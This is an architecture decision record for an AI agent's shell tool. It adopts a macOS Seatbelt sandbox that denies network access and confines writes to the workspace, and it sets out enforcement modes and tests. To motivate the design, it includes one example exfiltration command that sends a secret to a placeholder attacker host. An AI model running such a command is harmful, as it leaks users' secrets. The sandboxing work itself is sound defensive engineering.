# ADR 0007 — OS sandbox for `shell` (macOS Seatbelt; deny-network; fail-closed as a mode)

- **Status:** Accepted
- **Date:** 2026-07-26
- **Deciders:** @zq940222
- **Related:** [ADR-0005](0005-shell-exec.md) (shell; named this as the top upgrade), `docs/agent-research.md` (§3.3 Codex Seatbelt/bwrap sandbox, §287 minimum-privilege sandbox, line 339 "shell 出 bwrap/容器为进阶")

## Context

ADR-0005 shipped `shell` with an honest posture: **the boundary is the human approval, not a
sandbox.** The env-scrub, cwd default, timeout, and output caps are blast-radius reduction, not
containment — a command a human approves can still write anywhere and reach the network
(`curl evil?d=$secret`). ADR-0005 named an OS-kernel sandbox as the top upgrade. This ADR is that
upgrade: real containment underneath the existing approval.

The references converge on the same mechanism: **Codex** uses macOS **Seatbelt** (`sandbox-exec`)
and Linux **bwrap**+seccomp, with *sandbox ⊥ approval* as orthogonal layers and **fail-closed**
enforcement; the research (§287) calls minimum-privilege sandboxing the way to bound "模型错误和
注入攻击的爆炸半径" (the blast radius of model error and injection).

**This design is grounded in probes on the dev host (macOS 26.4.1), not assumed:**
- A `sandbox-exec` SBPL profile (`deny default`, `allow file-read*`, `file-write*` only under the
  workspace, `deny network*`) enforces correctly: basic exec runs, in-workspace write succeeds,
  **out-of-workspace write → "Operation not permitted"**, **`curl` → network failure**, system
  reads succeed.
- **Kill still works:** `sleep 30` under `sandbox-exec` with a 300 ms Bun timeout is SIGKILLed at
  ~302 ms with **zero surviving procs** — the `sandbox-exec → sh → command` chain is
  `execve`-replaced (same pid), so Bun's kill reaches the sandboxed command. ADR-0005 §5 stands.
- **The workspace path must be a realpath.** A profile built with the raw `/var/folders/…` path
  **denies** the write; the realpath (`/private/var/folders/…`) allows it — `/var` is a symlink
  and the kernel matches the resolved path. Getting this wrong denies *every* write and breaks
  `shell` silently.

## Decision

### 1. Wrap the command via the existing spawn seam — no engine change

`shell` already runs through a `SpawnFn`/`SpawnArgs` seam. The sandbox is a pure
**`SpawnArgs → SpawnArgs` transform**: on macOS it rewrites `cmd` from `["sh","-c",command]` to
`["sandbox-exec","-p",<profile>,"sh","-c",command]`. Timeout, env-scrub, cwd, and output handling
are untouched; `bunSpawn` stays sandbox-agnostic (it runs whatever `cmd` it's given).

### 2. Policy: **workspace-write + deny-network** (Codex's default mode)

The generated SBPL profile:
- `deny default` — everything not explicitly allowed is denied.
- `allow file-read*` — reads are broad. `dyld`, shared libs, and the command binaries need it, and
  *reading isn't the exfil risk — the network is*.
- `allow file-write*` only under the **realpath'd** workspace and the temp dirs (+ `/dev/null`,
  `/dev/stdout`, `/dev/stderr`). Everything else is read-only.
- `deny network*` — **the central win**: a sandboxed command cannot open a socket, so it cannot
  exfiltrate. Combined with the env-scrub (which already hides the keys), the outbound leg of the
  lethal trifecta is closed at the OS level, not just discouraged.

### 3. The workspace path is realpath'd and SBPL-escaped (or the command is refused)

Per the probe, the path in the profile is the **resolved** path (`realpathSync`). It is also
interpolated into an SBPL string, so a path containing a `"` or `\` is **escaped**; a path that
can't be safely represented causes the sandbox to **refuse** (fail-closed), never to silently emit
a weaker profile. "Profile built by string interpolation" is exactly where a silent policy
weakening hides.

### 4. Three modes; fail-closed is a mode, not the default

`AGENT_SHELL_SANDBOX`:
- **`auto`** (default) — sandbox when the platform mechanism is available; otherwise run
  **unsandboxed but still HITL-gated**, with a **loud startup diagnostic** naming the reason.
- **`require`** — fail closed: if the mechanism is unavailable or the profile can't be built, the
  command is **denied** with a clear message.
- **`off`** — never sandbox (Codex's `danger-full-access`), for trusted/CI contexts.

Rationale for `auto` over fail-closed-by-default: unlike Codex, where the sandbox *is* the boundary,
ours is already the HITL approval (ADR-0005). The sandbox is **defense-in-depth**, so falling back
to the documented status quo (approval-gated, unsandboxed) is not a regression — while `require`
gives hard containment to anyone who wants it. The fallback must be **loud**, not silent.

### 5. Platform: Seatbelt now, bwrap deferred

`sandboxMechanism(platform)` returns `"seatbelt"` on `darwin`, and `null` elsewhere for now
(`bwrap` on Linux is a follow-up — it isn't on the dev host and can't be tested here). So on Linux
today: `auto` → unsandboxed+HITL, `require` → fail-closed. Windows is out of scope.

### 6. Sandbox ⊥ approval — but approval is unchanged in v1

The payoff of a sandbox is that it *lets you relax approval* (auto-approve inside a
workspace-write sandbox → fewer prompts). That is a **separate policy decision** and is deliberately
deferred: this phase adds containment only. `shell` stays `high`-risk and HITL-gated. Likewise,
surfacing sandbox state **in the approval prompt** (a "⚠ UNSANDBOXED" badge on `PermissionRequest`)
is deferred to a follow-up — v1 makes the fallback loud via the startup diagnostic (§4); the badge
would need a field threaded through the permission event and both approvers.

### 7. Testability: pure functions + platform-gated integration

- **Pure, unit-tested:** `buildSeatbeltProfile(realWorkspace)` (asserts the profile contains the
  resolved workspace subpath, denies network, escapes the path) and `applySandbox(args, cfg)`
  (asserts the `cmd` wrapping, and the `require`-with-no-mechanism → error path).
- **Real, `darwin`-gated integration:** actually run through `sandbox-exec` and assert an
  out-of-workspace write is denied, network is denied, and an in-workspace write succeeds. These
  **skip** on non-darwin / where `sandbox-exec` is absent (like the existing real-spawn tests),
  so CI on Linux stays green.

## Consequences

**Positive**
- Real containment under the approval: a `shell` command can't write outside the workspace or
  reach the network, so an approved-but-malicious or injection-driven command is bounded.
- The network denial closes the outbound-exfil leg at the OS level — the strongest single
  mitigation added since `shell` shipped.
- Composes through the existing seam (no engine change); verified enforcement + kill on the host.

**Negative / accepted**
- **`deny network*` breaks `npm install`, `git fetch`, `curl`, etc. inside `shell`** — a behavior
  change for anyone already using `shell` for network tasks. That is the cost of the mode being
  default-on; use `AGENT_SHELL_SANDBOX=off` (or a future network-allow policy) when a command
  legitimately needs the network.
- **`auto` falls back to unsandboxed on unsupported platforms** (Linux today). Loud, and `require`
  exists for hard containment — but it is not fail-closed by default.
- **`.git` is writable inside the workspace.** Codex keeps it read-only (anti-tamper). Our
  workspace is usually not a repo, but `AGENT_WORKSPACE` *can* point at one — recorded as a known
  gap, a cheap follow-up hardening.
- Linux/Windows are unsandboxed until bwrap lands; the grandchild-orphan caveat (ADR-0005 §5) is
  unchanged (the direct command *is* killed).

## Alternatives considered

- **Fail-closed by default.** Rejected as the default: it breaks `shell` on every platform without a
  mechanism (Linux CI included) and treats the sandbox as the sole boundary when HITL already is
  one. Offered as `require` for those who want it.
- **Container / microVM isolation** (Docker, Firecracker). Rejected for v1: a heavy runtime
  dependency against the from-scratch/minimal-deps ethos; `sandbox-exec` is built into macOS and
  needs no install.
- **Allow loopback/localhost network.** Deferred: useful for testing local servers, but deny-all is
  simpler and strictly safer for v1; revisit as a policy refinement.
- **Relax approval when sandboxed** (the sandbox ⊥ approval payoff). Deferred: a separate,
  higher-stakes policy change that deserves its own phase.
